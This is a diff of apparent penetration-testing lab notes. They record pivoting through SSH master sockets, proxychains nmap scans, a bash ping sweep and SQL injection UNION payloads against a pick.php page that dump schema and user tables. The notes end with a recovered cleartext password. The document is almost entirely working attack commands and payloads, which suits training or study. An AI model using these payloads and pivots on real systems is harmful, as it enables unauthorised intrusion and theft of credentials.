@@ -24,18 +24,17 @@ paste into schyber schef, rot13 or base64
 Place second Master Socket onto Target and proxychains nmap 10.10.28.30
 ssh -MS /tmp/two user2@10.50.37.23
 
-
+on box:
 /bin/bash
 for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
-
 cat /etc/hosts
 did proxychains nmap, came up with ports 22 and port 80 open
 then I made a tunnel to the 80 and went on the website.
 Found it had lists, so i did 
-http://127.0.0.1:41804/pick.php?product=7%20UNION%20select%20table_schema,column_name,%20table_name%20from%20information_schema.columns;#
+http://127.0.0.1:41804/pick.php?product=7 UNION select table_schema,column_name, table_name from information_schema.columns;#
 It didn't work on the first product, did prod 7
 did 
-http://127.0.0.1:41804/pick.php?product=7%20UNION%20select%20user_id,%20name,%20username%20from%20siteusers.users;#
+http://127.0.0.1:41804/pick.php?product=7 UNION select user_id, name, username from siteusers.users;#
 and found passwords. Passwords are either going to be in ROT13 or Base64, converted they are
 
 AARON: apasswordyPa$$word
